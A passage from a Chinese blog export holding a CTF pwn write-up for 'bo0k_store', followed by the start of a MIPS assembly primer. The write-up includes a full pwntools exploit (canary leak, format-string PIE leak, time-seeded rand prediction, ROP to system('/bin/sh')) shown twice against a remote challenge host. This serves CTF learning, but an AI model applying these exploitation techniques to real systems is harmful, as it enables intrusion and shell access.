class=\"line\">\trand</span><br><span class=\"line\">\tio.sendafter(<span class=\"string\">&quot;Let&#x27;s get started\\n&quot;</span>,rand)</span><br><span class=\"line\">\tpayload=offset*<span class=\"string\">b&#x27;a&#x27;</span>+p64(canary)</span><br><span class=\"line\">\tpayload+=p64(elf.bss()+base+<span class=\"number\">0x800</span>)+p64(pop_rdi)</span><br><span class=\"line\">\tpayload+=p64(puts_got)+p64(puts_plt)+p64(read)</span><br><span class=\"line\">\t<span class=\"comment\">#io.recvuntil(&quot;OK! You are right!!!\\n&quot;)</span></span><br><span class=\"line\">\t<span class=\"comment\">#gdb.attach(io,&quot;b *bo0k_store&quot;)</span></span><br><span class=\"line\">\tio.sendafter(<span class=\"string\">&quot;What bo0k do you want??\\n&quot;</span>,payload)</span><br><span class=\"line\">\tio.recvuntil(<span class=\"string\">&quot;This book is for you\\n&quot;</span>)</span><br><span class=\"line\">\tputs=u64(io.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">\t<span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(puts))</span><br><span class=\"line\">\tlibcbase=puts-libc.sym[<span class=\"string\">&quot;puts&quot;</span>]</span><br><span class=\"line\">\t<span class=\"comment\">#log.success(&quot;libc-&#123;&#125;&quot;.format(hex(libc)))</span></span><br><span class=\"line\">\tsystem=libcbase+libc.sym[<span class=\"string\">&quot;system&quot;</span>]</span><br><span class=\"line\">\tbin_sh=libcbase+<span class=\"number\">0x1d8678</span></span><br><span class=\"line\">\t<span class=\"comment\">#rop </span></span><br><span class=\"line\">\tpayload=<span class=\"number\">0x18</span>*<span class=\"string\">b&#x27;a&#x27;</span>+p64(canary)+p64(canary)+p64(pop_rdi)</span><br><span class=\"line\">\tpayload+=p64(bin_sh)+p64(ret)+p64(system)</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tio.send(payload)</span><br><span class=\"line\">\tio.interactive()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">12</span>):</span><br><span class=\"line\">\t<span class=\"keyword\">try</span>:</span><br><span class=\"line\">\t\tpwn(mode)</span><br><span class=\"line\">\t<span class=\"keyword\">except</span>:</span><br><span class=\"line\">\t\t<span class=\"built_in\">print</span>(<span class=\"string\">&quot;again!&quot;</span>)</span><br><span class=\"line\">\t</span><br></pre></td></tr></table></figure>\n<h2 id=\"rand-源码\"><a href=\"#rand-源码\" class=\"headerlink\" title=\"rand 源码\"></a>rand 源码</h2><p><strong>gcc 编译之后才能运行哦</strong></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;time.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">\tsrand(time(<span class=\"number\">0</span>)+<span class=\"number\">10</span>);</span><br><span class=\"line\">\t<span class=\"type\">int</span> random=rand()%<span class=\"number\">1131796</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;rand:%d\\n&quot;</span>,random);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>","excerpt":"","more":"<h1 id=\"bo0k-store\"><a href=\"#bo0k-store\" class=\"headerlink\" title=\"bo0k_store\"></a>bo0k_store</h1><h2 id=\"ida分析\"><a href=\"#ida分析\" class=\"headerlink\" title=\"ida分析\"></a>ida分析</h2><p><strong>先用checksec 看了一下保护机制–全开</strong></p>\n<h3 id=\"mian函数\"><a href=\"#mian函数\" class=\"headerlink\" title=\"mian函数\"></a>mian函数</h3><p><img src=\"https://gitee.com/jiang-xunpan/my_pic/raw/master/img/image-20250525114939255.png\" alt=\"image-20250525114939255\"><br>1.可以看到，会循环调用menu，进行选择进入不同的book_store.<br>2.当v3&#x3D;1668508013时，是另一题的彩蛋，不用管他。<br>3.按照1 2 3 的顺序依次查看各个选项的内容。</p>\n<h3 id=\"选项1–b0ok-store\"><a href=\"#选项1–b0ok-store\" class=\"headerlink\" title=\"选项1–b0ok_store\"></a>选项1–b0ok_store</h3><p><img src=\"https://gitee.com/jiang-xunpan/my_pic/raw/master/img/image-20250525115233521.png\" alt=\"image-20250525115233521\"><br>1.两次输入0x19字节。为什么呢？熟悉的同学可能会想到，第一次覆盖canary高字节，然后再改回去。所以这个地方是留个我们泄露canary的。应该是的<br>2.同时注意到这个b0ok_times,它的初始值为1，所以只有一次机会利用这个选项。</p>\n<h3 id=\"选项2–b00k-store\"><a href=\"#选项2–b00k-store\" class=\"headerlink\" title=\"选项2–b00k_store\"></a>选项2–b00k_store</h3><p><img src=\"https://gitee.com/jiang-xunpan/my_pic/raw/master/img/image-20250525115622638.png\" alt=\"image-20250525115622638\"><br>1.熟悉的格式化字符串漏洞，8字节的大小还是太长了，可以泄露很多东西。<br>2.具体怎么使用还是需要动调看栈上有什么数据可以泄露。<br>3.这题目是开启了所有保护机制，所以极有可能是用来泄露pie 和 stack 的。</p>\n<h3 id=\"选项3–bo0k-store\"><a href=\"#选项3–bo0k-store\" class=\"headerlink\" title=\"选项3–bo0k_store\"></a>选项3–bo0k_store</h3><p><img src=\"https://gitee.com/jiang-xunpan/my_pic/raw/master/img/image-20250525120159544.png\" alt=\"image-20250525120159544\"><br>1.本题的核心重点，来了。首先可以看到这里的read。老朋友了，0x50的读入，有0x28的空间留给我们去rop，应该是利用这里泄露libc再返回执行system。<br>2.但是这里有一个随机数，我们需要正确的输入随机数，才能顺利的继续执行。那么我们要如何绕过这个可恶的随机数呢？</p>\n<h2 id=\"rand-伪随机数\"><a href=\"#rand-伪随机数\" class=\"headerlink\" title=\"rand 伪随机数\"></a>rand 伪随机数</h2><h3 id=\"方法1–ctypes\"><a href=\"#方法1–ctypes\" class=\"headerlink\" title=\"方法1–ctypes\"></a>方法1–ctypes</h3><p><a href=\"https://blog.csdn.net/weixin_39194641/article/details/103089862\">CTF中的PWN——srand()&#x2F;rand()漏洞（栈溢出）_ctf rand-CSDN博客</a><br><a href=\"https://n0we11.github.io/2023/10/16/PWN%E4%B8%AD%E7%9A%84%E9%9A%8F%E6%9C%BA%E6%95%B0%E6%BC%8F%E6%B4%9E/\">随机数利用</a></p>\n<p>1.在这两篇博客当中说的很简单，就是rand()是基于时间戳生成的随机数，所以只要我们用同样的函数，同样的参数，同样的时间，就能得到同样的随机数。<br>2.所以我们使用ctypes库，调用c的链接库和函数得出应该结果，再把结果输入给本题的程序就行。<br>3.这种方法，比较看运行的速度? 如果有延迟导致的不同时间，就要尝试几次。</p>\n<h3 id=\"方法2–奇技淫巧\"><a href=\"#方法2–奇技淫巧\" class=\"headerlink\" title=\"方法2–奇技淫巧\"></a>方法2–奇技淫巧</h3><p><a href=\"https://heshi906.github.io/2023/09/23/%E5%A5%87%E6%80%9D%E5%A6%99%E6%83%B3%EF%BC%88%E7%A0%B4%E8%A7%A3%E9%9A%8F%E6%9C%BA%E6%95%B0%EF%BC%89/index.html\">奇思妙想（破解随机数） | 未来大pwn子的blog</a><br>1.这篇博客的方法甚得我心。就是我直接自己也写一个程序，生成10s后的随机数，然后拿这个结果，去输入。后续重复运行题目程序，去撞这个时间。<br>2.在我的解法中就是利用了这个，与方法1比，这个比较吃手法，因为按的太快，就卡不上10s。按得太慢也卡不上10s 。但是实际操作感觉容错还是挺高的，基本上我每一次都能通，而且远程也没问题。</p>\n<h2 id=\"gdb-分析\"><a href=\"#gdb-分析\" class=\"headerlink\" title=\"gdb 分析\"></a>gdb 分析</h2><h3 id=\"找偏移和泄露\"><a href=\"#找偏移和泄露\" class=\"headerlink\" title=\"找偏移和泄露\"></a>找偏移和泄露</h3><p><img src=\"https://gitee.com/jiang-xunpan/my_pic/raw/master/img/image-20250525122212160.png\" alt=\"image-20250525122212160\"><br>1.选项1是刚好覆盖到canary，没什么好说的，经典手法了。</p>\n<p><img src=\"https://gitee.com/jiang-xunpan/my_pic/raw/master/img/image-20250525122423039.png\" alt=\"image-20250525122423039\"><br>1.这里可以泄露栈基址和pie。如果有其他条件配合的话，还可以有更美妙的利用</p>\n<h2 id=\"利用思路\"><a href=\"#利用思路\" class=\"headerlink\" title=\"利用思路\"></a>利用思路</h2><p>1.首先在选项1中泄露canary，再从选项2中拿到pie和stack。这样就可以在选项3中，泄露libc。然后把返回地址设置成通过随机数检验的read的地址，直接读入，就不用第二次输入随机数了。<br>2.所以，第一次在选项3中的输入需要注意rbp的值不能随意覆盖，必须得是合法的地址。拿到pie之后我们可以把rbp写成bss段上的地址。这样下一次的输入，就会在bss段上。最后leave ret时，会跳转过来继续执行。当然也可以写stack上的某个地址。</p>\n<h2 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> ctypes <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level=<span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\">mode=<span class=\"number\">1</span></span><br><span class=\"line\">url=<span class=\"string\">&#x27;43.139.51.42&#x27;</span></span><br><span class=\"line\">port=<span class=\"number\">9999</span></span><br><span class=\"line\">libc=ELF(<span class=\"string\">&quot;./libc.so.6&quot;</span>)</span><br><span class=\"line\"><span class=\"comment\">#exp=cdll.LoadLibraary(&quot;./libc.so.6&quot;)</span></span><br><span class=\"line\">exe=process(<span class=\"string\">&quot;./rand&quot;</span>)</span><br><span class=\"line\">elf=ELF(<span class=\"string\">&quot;./pwn&quot;</span>)</span><br><span class=\"line\"><span class=\"comment\"># 提前10s 拿到随机数 注意这里结尾有换行符</span></span><br><span class=\"line\">rand=exe.recvline()[<span class=\"number\">5</span>:]</span><br><span class=\"line\">offset=<span class=\"number\">0x18</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">choice</span>(<span class=\"params\">op,io</span>):</span><br><span class=\"line\">\tio.recvuntil(<span class=\"string\">&quot;You choice: \\n&quot;</span>)</span><br><span class=\"line\">\tio.sendline(<span class=\"built_in\">str</span>(op))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">leak_stack_pie</span>(<span class=\"params\">io</span>):</span><br><span class=\"line\">\t<span class=\"comment\">#leak-stack &amp; canary</span></span><br><span class=\"line\">\tchoice(<span class=\"number\">2</span>,io)</span><br><span class=\"line\">\tpayload=<span class=\"string\">b&#x27;%9$p%8$p&#x27;</span>.ljust(<span class=\"number\">8</span>,<span class=\"string\">b&quot;\\x41&quot;</span>)</span><br><span class=\"line\">\tio.sendafter(<span class=\"string\">&quot;What b00k do you want??\\n&quot;</span>,payload)</span><br><span class=\"line\">\t<span class=\"comment\">#gdb.attach(io)</span></span><br><span class=\"line\">\tbase=<span class=\"built_in\">int</span>(io.recv(<span class=\"number\">14</span>),<span class=\"number\">16</span>)-<span class=\"number\">0x1989</span>-<span class=\"number\">196</span></span><br><span class=\"line\">\tstack=<span class=\"built_in\">int</span>(io.recv(<span class=\"number\">14</span>),<span class=\"number\">16</span>)</span><br><span class=\"line\">\t<span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(base))</span><br><span class=\"line\">\t<span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(stack))</span><br><span class=\"line\">\tlog.success(<span class=\"string\">&quot;base-&#123;&#125;&quot;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">hex</span>(base)))</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> base,stack</span><br><span class=\"line\">\t</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">leak_canary</span>(<span class=\"params\">io</span>):</span><br><span class=\"line\">\tchoice(<span class=\"number\">1</span>,io)</span><br><span class=\"line\">\tpayload=<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x18</span>+<span class=\"string\">b&#x27;b&#x27;</span></span><br><span class=\"line\">\tio.sendafter(<span class=\"string\">&quot;What b0ok do you want??\\n&quot;</span>,payload)</span><br><span class=\"line\">\tio.recvuntil(<span class=\"string\">&quot;ab&quot;</span>)</span><br><span class=\"line\">\tcanary=u64(io.recv(<span class=\"number\">7</span>).rjust(<span class=\"number\">8</span>,<span class=\"string\">b&quot;\\x00&quot;</span>))</span><br><span class=\"line\">\t<span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(canary))</span><br><span class=\"line\">\tio.sendafter(<span class=\"string\">&quot;Confirm again\\n&quot;</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>*<span class=\"number\">0x19</span>)</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> canary</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">pwn</span>(<span class=\"params\">mode</span>):</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> mode==<span class=\"number\">0</span> :</span><br><span class=\"line\">\t\tio=process(<span class=\"string\">&quot;./pwn&quot;</span>)</span><br><span class=\"line\">\t<span class=\"keyword\">else</span>:</span><br><span class=\"line\">\t\tio=remote(url,port)</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tcanary=leak_canary(io)</span><br><span class=\"line\">\tbase,stack=leak_stack_pie(io)</span><br><span class=\"line\">\t<span class=\"comment\"># got&amp;plt</span></span><br><span class=\"line\">\tputs_got=elf.got[<span class=\"string\">&quot;puts&quot;</span>]+base</span><br><span class=\"line\">\tputs_plt=elf.plt[<span class=\"string\">&quot;puts&quot;</span>]+base</span><br><span class=\"line\">\t<span class=\"comment\"># gadget</span></span><br><span class=\"line\">\tpop_rdi=<span class=\"number\">0x13F6</span>+base</span><br><span class=\"line\">\tret=<span class=\"number\">0x13F7</span>+base</span><br><span class=\"line\">\tread=<span class=\"number\">0x1878</span>+base</span><br><span class=\"line\">\t<span class=\"comment\"># leak-libc</span></span><br><span class=\"line\">\tchoice(<span class=\"number\">3</span>,io)</span><br><span class=\"line\">\t<span class=\"comment\">#gdb.attach(io)</span></span><br><span class=\"line\">\trand</span><br><span class=\"line\">\tio.sendafter(<span class=\"string\">&quot;Let&#x27;s get started\\n&quot;</span>,rand)</span><br><span class=\"line\">\tpayload=offset*<span class=\"string\">b&#x27;a&#x27;</span>+p64(canary)</span><br><span class=\"line\">\tpayload+=p64(elf.bss()+base+<span class=\"number\">0x800</span>)+p64(pop_rdi)</span><br><span class=\"line\">\tpayload+=p64(puts_got)+p64(puts_plt)+p64(read)</span><br><span class=\"line\">\t<span class=\"comment\">#io.recvuntil(&quot;OK! You are right!!!\\n&quot;)</span></span><br><span class=\"line\">\t<span class=\"comment\">#gdb.attach(io,&quot;b *bo0k_store&quot;)</span></span><br><span class=\"line\">\tio.sendafter(<span class=\"string\">&quot;What bo0k do you want??\\n&quot;</span>,payload)</span><br><span class=\"line\">\tio.recvuntil(<span class=\"string\">&quot;This book is for you\\n&quot;</span>)</span><br><span class=\"line\">\tputs=u64(io.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">\t<span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(puts))</span><br><span class=\"line\">\tlibcbase=puts-libc.sym[<span class=\"string\">&quot;puts&quot;</span>]</span><br><span class=\"line\">\t<span class=\"comment\">#log.success(&quot;libc-&#123;&#125;&quot;.format(hex(libc)))</span></span><br><span class=\"line\">\tsystem=libcbase+libc.sym[<span class=\"string\">&quot;system&quot;</span>]</span><br><span class=\"line\">\tbin_sh=libcbase+<span class=\"number\">0x1d8678</span></span><br><span class=\"line\">\t<span class=\"comment\">#rop </span></span><br><span class=\"line\">\tpayload=<span class=\"number\">0x18</span>*<span class=\"string\">b&#x27;a&#x27;</span>+p64(canary)+p64(canary)+p64(pop_rdi)</span><br><span class=\"line\">\tpayload+=p64(bin_sh)+p64(ret)+p64(system)</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tio.send(payload)</span><br><span class=\"line\">\tio.interactive()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">12</span>):</span><br><span class=\"line\">\t<span class=\"keyword\">try</span>:</span><br><span class=\"line\">\t\tpwn(mode)</span><br><span class=\"line\">\t<span class=\"keyword\">except</span>:</span><br><span class=\"line\">\t\t<span class=\"built_in\">print</span>(<span class=\"string\">&quot;again!&quot;</span>)</span><br><span class=\"line\">\t</span><br></pre></td></tr></table></figure>\n<h2 id=\"rand-源码\"><a href=\"#rand-源码\" class=\"headerlink\" title=\"rand 源码\"></a>rand 源码</h2><p><strong>gcc 编译之后才能运行哦</strong></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;time.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">\tsrand(time(<span class=\"number\">0</span>)+<span class=\"number\">10</span>);</span><br><span class=\"line\">\t<span class=\"type\">int</span> random=rand()%<span class=\"number\">1131796</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;rand:%d\\n&quot;</span>,random);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>"},{"title":"mips基础","cover":"/img/阿尼亚.png","_content":"# mips基础\n\n## 汇编\n\n### 通用寄存器\n\n| REGISTER | NAME    | USAGE                                                 |\n| -------- | ------- | ----------------------------------------------------- |\n| $0       | $zero   | 常量0(constant value 0)                                 |\n| $1       | $at     | 保留给汇编器(Reserved for assembler)                        |\n| $2-$3    | $v0-$v1 | 函数调用返回值(values for results and expression evaluation) |\n| $4-$7    | $a0-$a3 | 函数调用参数(arguments)                                     |\n| $8-$15   | $t0-$t7 | 暂时的(或随便用的)                                            |\n| $16-$23  | $s0-$s7 | 保存的(或如果用，需要SAVE/RESTORE的)(saved)                      |\n| $24-$25  | $t8-$t9 | 暂时的(或随便用的)                                            |\n| $28      | $gp     | 全局指针(Global Pointer)                                  |\n| $29      | $sp     | 堆栈指针(Stack Pointer)                                   |\n| $30      | $fp     | 帧指针(Frame Pointer)                                    |\n| $31      | $ra     | 返回地址(return address)                                  |\n\n### 指令\n\nmips 没有push 和 pop 指令。而且qemu 和硬件不支持NX、alsr，所以很多时候可以直接写shellcode。\n\n指令太多了...\n\n|         |                                                          |                  |\n| ------- | -------------------------------------------------------- | ---------------- |\n| 指令      | 功能                                                       | 应用实例             |\n| LB      | 从存储器中读取一个字节的数据到寄存器中                                      | LB R1, 0(R2)     |\n| LH      | 从存储器中读取半个字的数据到寄存器中                                       | LH R1, 0(R2)     |\n| LW      | 从存储器中读取一个字的数据到寄存器中                                       | LW R1, 0(R2)     |\n| LD      | 从存储器中读取双字的数据到寄存器中                                        | LD R1, 0(R2)     |\n| L.S     | 从存储器中读取单精度浮点数到寄存器中                                       | L.S R1, 0(R2)    |\n| L.D     | 从存储器中读取双精度浮点数到寄存器中                                       | L.D R1, 0(R2)    |\n| LBU     | 功能与LB指令相同，但读出的是不带符号的数据                                   | LBU R1, 0(R2)    |\n| LHU     | 功能与LH指令相同，但读出的是不带符号的数据                                   | LHU R1, 0(R2)    |\n| LWU     | 功能与LW指令相同，但读出的是不带符号的数据                                   | LWU R1, 0(R2)    |\n| SB      | 把一个字节的数据从寄存器存储到存储器中                                      | SB R1, 0(R2)     |\n| SH      | 把半个字节的数据从寄存器存储到存储器中                                      | SH R1，0(R2)      |\n| SW      | 把一个字的数据从寄存器存储到存储器中                                       | SW R1, 0(R2)     |\n| SD      | 把两个字节的数据从寄存器存储到存储器中                                      | SD R1, 0(R2)     |\n| S.S     | 把单精度浮点数从寄存器存储到存储器中                                       | S.S R1, 0(R2)    |\n| S.D     | 把双精度数据从存储器存储到存储器中                                        | S.D R1, 0(R2)    |\n| DADD    | 把两个定点寄存器的内容相加，也就是定点加                                     | DADD R1,R2,R3    |\n| DADDI   | 把一个寄存器的内容加上一个立即数                                         | DADDI R1,R2,#3   |\n| DADDU   | 不带符号的加                                                   | DADDU R1,R2,R3   |\n| DADDIU  | 把一个寄存器的内容加上一个无符号的立即数                                     | DADDIU R1,R2,#3  |\n| ADD.S   | 把一个单精度浮点数加上一个双精度浮点数，结果是单精度浮点数                            | ADD.S F0,F1,F2   |\n| ADD.D   | 把一个双精度浮点数加上一个单精度浮点数，结果是双精度浮点数                            | ADD.D F0,F1,F2   |\n| ADD.PS  | 两个单精度浮点数相加，结果是单精度浮点数                                     | ADD.PS F0,F1,F2  |\n| DSUB    | 两个寄存器的内容相减，也就是定点数的减                                      | DSUB R1,R2,R3    |\n| DSUBU   | 不带符号的减                                                   | DSUBU R1,R2,R3   |\n| SUB.S   | 一个双精度浮点数减去一个单精度浮点数，结果为单精度                                | SUB.S F1,F2,F3   |\n| SUB.D   | 一个双精度浮点数减去一个单精度浮点数，结果为双精度浮点数                             | SUB.D F1,F2,F3   |\n| SUB.PS  | 两个单精度浮点数相减                                               | SUB.SP F1,F2,F3  |\n| DDIV    | 两个定点寄存器的内容相除，也就是定点除                                      | DDIV Ｒ1,Ｒ2,Ｒ3    |\n| DDIVU   | 不带符号的除法运算                                                | DDIVU Ｒ1,Ｒ2,Ｒ3   |\n| DIV.S   | 一个双精度浮点数除以一个单精度浮点数，结果为单精度浮点数                             | DIV.S F1,F2,F3   |\n| DIV.D   | 一个双精度浮点数除以一个单精度浮点数，结果为双精度浮点数                             | DIV.D F1,F2,F3   |\n| DIV.PS  | 两个单精度浮点数相除，结果为单精度                                        | DIV.PS F1,F2,F3  |\n| DMUL    | 两个定点寄存器的内容相乘，也就是定点乘                                      | DMUL Ｒ1,Ｒ2,Ｒ3    |\n| DMULU   | 不带符号的乘法运算                                                | DMULU R1,R2,R3   |\n| MUL.S   | 一个双精度浮点数乘以一个单精度浮点数，结果为单精度浮点数                             | DMUL.S F1,F2,F3  |\n| MUL.D   | 一个双精度浮点数乘以一个单精度浮点数，结果为双精度浮点数                             | DMUL.D F1,F2,F3  |\n| MUL.PS  | 两个单精度浮点数相乘，结果为单精度浮点数                                     | DMUL.PS F1,F2,F3 |\n| AND     | 与运算，两个寄存器中的内容相与                                          | ANDＲ1,Ｒ2,Ｒ3      |\n| ANDI    | 一个寄存器中的内容与一个立即数相与                                        | ANDIＲ1,Ｒ2,#3     |\n| OR      | 或运算，两个寄存器中的内容相或                                          | ORＲ1,Ｒ2,Ｒ3       |\n| ORI     | 一个寄存器中的内容与一个立即数相或                                        | ORIＲ1,Ｒ2,#3      |\n| XOR     | 异或运算，两个寄存器中的内容相异或                                        | XORＲ1,Ｒ2,Ｒ3      |\n| XORI    | 一个寄存器中的内容与一个立即数异或                                        | XORIＲ1,Ｒ2,#3     |\n| BEQZ    | 条件转移指令，当寄存器中内容为0时转移发生                                    | BEQZ R1,0        |\n| BENZ    | 条件转移指令，当寄存器中内容不为0时转移发生                                   | BNEZ R1,0        |\n| BEQ     | 条件转移指令，当两个寄存器内容相等时转移发生                                   | BEQ R1,R2        |\n| BNE     | 条件转移指令，当两个寄存器中内容不等时转移发生                                  | BNE R1,R2        |\n| J       | 直接跳转指令，跳转的地址在指令中                                         | J name           |\n| JR      | 使用寄存器的跳转指令，跳转地址在寄存器中                                     | JR R1            |\n| JAL     | 直接跳转指令，并带有链接功能，指令的跳转地址在指令中，跳转发生时要把返回地址存放到R31这个寄存器中       | JAL R1 name      |\n| JALR    | 使用寄存器的跳转指令，并且带有链接功能，指令的跳转地址在寄存器中，跳转发生时指令的放回地址放在R31这个寄存器中 | JALR R1          |\n| MOV.S   | 把一个单精度浮点数从一个浮点寄存器复制到另一个浮点寄存器                             | MOV.S F0,F1      |\n| MOV.D   | 把一个双精度浮点数从一个浮点寄存器复制到另一个浮点寄存器                             | MOV.D F0,F1      |\n| MFC0    | 把一个数据从通用寄存器复制到特殊寄存器                                      | MFC0 R1,R2       |\n| MTC0    | 把一个数据从特殊寄存器复制到通用寄存器                                      | MTC0 R1,R2       |\n| MFC1    | 把一个数据从定点寄存器复制到浮点寄存器                                      | MFC1 R1,F1       |\n| MTC1    | 把一个数据从浮点寄存器复制到定点寄存器                                      | MTC1 R1,F1       |\n| LUI     | 把一个16位的立即数填入到寄存器的高16位，低16位补零                             | LUI R1,#42       |\n| DSLL    | 双字逻辑左移                                                   | DSLL R1,R2,#2    |\n| DSRL    | 双字逻辑右移                                                   | DSRL R1,R2,#2    |\n| DSRA    | 双字算术右移                                                   | DSRA R1,R2,#2    |\n| DSLLV   | 可变的双字逻辑左移                                                | DSLLV R1,R2,#2   |\n| DSRLV   | 可变的双字罗伊右移                                                | DSRLV R1,R2,#2   |\n| DSRAV   | 可变的双字算术右移                                                | DSRAV R1,R2,#2   |\n| SLT     | 如果R2的值小于R3，那么设置R1的值为1，否则设置R1的值为0                         | SLT R1,R2,R3     |\n| SLTI    | 如果寄存器R2的值小于立即数，那么设置R1的值为1，否则设置寄存器R1的值为0                  | SLTI R1,R2,#23   |\n| SLTU    | 功能与SLT一致，但是带符号的                                          | SLTU R1,R2,R3    |\n| SLTUI   | 功能与SLT一致，但不带符号                                           | SLTUI R1,R2,R3   |\n| MOVN    | 如果第三个寄存器的内容为负，那么复制一个寄存器的内容到另外一个寄存器                       | MOVN R1,R2,R3    |\n| MOVZ    | 如果第三个寄存器的内容为0，那么复制一个寄存器的内容到另外一个寄存器                       | MOVZ R1,R2,R3    |\n| TRAP    | 根据地址向量转入管态                                               |                  |\n| ERET    | 从异常中返回到用户态                                               |                  |\n| MADD.S  | 一个双精度浮点数与单精度浮点数相乘加，结果为单精度                                |                  |\n| MADD.D  | 